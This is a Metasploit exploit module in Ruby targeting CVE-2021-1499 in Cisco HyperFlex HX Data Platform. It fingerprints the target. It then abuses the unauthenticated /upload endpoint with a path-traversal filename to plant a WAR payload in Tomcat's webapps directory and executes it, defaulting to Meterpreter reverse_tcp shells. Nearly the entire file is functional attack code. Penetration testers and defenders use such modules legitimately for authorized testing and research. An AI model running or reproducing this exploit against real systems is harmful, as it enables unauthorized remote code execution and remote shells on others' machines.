##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)',
        'Description' => %q{
          This module exploits an unauthenticated file upload vulnerability in
          Cisco HyperFlex HX Data Platform's /upload endpoint to upload and
          execute a payload as the Tomcat user.
        },
        'Author' => [
          'Nikita Abramov',      # Discovery
          'Mikhail Klyuchnikov', # Discovery
          'wvu',                 # Research and guidance
          'jheysel-r7'           # Metasploit Module
        ],
        'References' => [
          ['CVE', '2021-1499'], # HyperFlex HX File Upload
          ['URL', 'https://attackerkb.com/assessments/82738621-1114-4aba-990a-9ea007b05834']
        ],
        'DisclosureDate' => '2021-05-05',
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_X86, ARCH_X64, ARCH_JAVA],
        'Privileged' => false, # Privesc left as an exercise for the reader
        'Targets' => [
          [
            'Java Dropper',
            {
              'Platform' => 'java',
              'Arch' => ARCH_JAVA,
              'Version' => Rex::Version.new('2.137'),
              'Type' => :java_dropper,
              'DefaultOptions' => {
                'PAYLOAD' => 'java/meterpreter/reverse_tcp',
                'WfsDelay' => 10
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
                'WfsDelay' => 10
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('UPLOAD_FILE_NAME', [false, 'Choose a filename for the payload. (Default is random)', rand_text_alpha(rand(8..15))])
    ])
  end

  def check
    # The homepage behind SSL indicates whether the endpoint is running Cisco HyperFlex
    # Installer:         <title>Hyperflex Installer</title>
    # Installed Product: <title>Cisco HyperFlex Connect</title>
    # Both the installer and installed product are vulnerable
    res_ssl = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path),
      'rport' => 443,
      'SSL' => true
    )
    unless res_ssl && res_ssl.body[%r{<title>(?:Hyperflex Installer|Cisco HyperFlex Connect)</title>}]
      return Exploit::CheckCode::Safe
    end

    # The vulnerability, however, lies on the HTTP endpoint /upload.
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'upload')
    )
    if res && res.code == 400 && res.body.include?('Apache Tomcat') && res.headers['Server'] && res.headers['Server'].include?('nginx')
      return Exploit::CheckCode::Appears
    elsif res && res.code == 404
      return CheckCode::Safe
    end

    CheckCode::Unknown
  end

  def prepare_payload(app_base, jsp_name)
    print_status('Preparing payload...')
    war_payload = payload.encoded_war({ app_name: app_base, jsp_name: jsp_name }).to_s
    fname = app_base + '.war'
    post_data = Rex::MIME::Message.new
    post_data.add_part(fname, nil, nil, 'form-data; name="fname"')
    post_data.add_part('/upload', nil, nil, 'form-data; name="uploadDir"')
    post_data.add_part(war_payload,
                       'application/octet-stream', 'binary',
                       "form-data; name=\"#{jsp_name}\"; filename=\"../../../lib/tomcat7/webapps/#{fname}\"")
    post_data
  end

  def upload_payload(post_data)
    print_status('Uploading payload...')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'upload'),
      'method' => 'POST',
      'data' => post_data.to_s,
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}"
    )
    if res && res.code == 200 && res.body.to_s =~ /result.*filename:/
      print_good('Payload uploaded successfully')
    else
      fail_with(Failure::UnexpectedReply, 'Payload upload attempt failed')
    end

    register_dir_for_cleanup('/var/lib/tomcat7/webapps/crossdomain.xml/')
    register_file_for_cleanup('/var/lib/tomcat7/webapps/crossdomain.xml.war')
  end

  def execute_payload(url)
    print_status("Executing payload... calling: #{url}")
    res = send_request_cgi(
      'uri' => url,
      'method' => 'GET'
    )
    if res && res.code == 200
      print_good('Payload executed successfully')
    else
      fail_with(Failure::UnexpectedReply, 'Payload execution attempt failed')
    end
  end

  def exploit
    app_base = 'crossdomain.xml'
    jsp_name = datastore['UPLOAD_FILE_NAME']
    data = prepare_payload(app_base, jsp_name)
    upload_payload(data)
    sleep(datastore['WfsDelay'])
    if target.name == 'Java Dropper'
      url = normalize_uri(target_uri.path, app_base.to_s)
    else
      url = normalize_uri(target_uri.path, app_base.to_s, "#{jsp_name}.jsp")
    end
    execute_payload(url)
  end
end
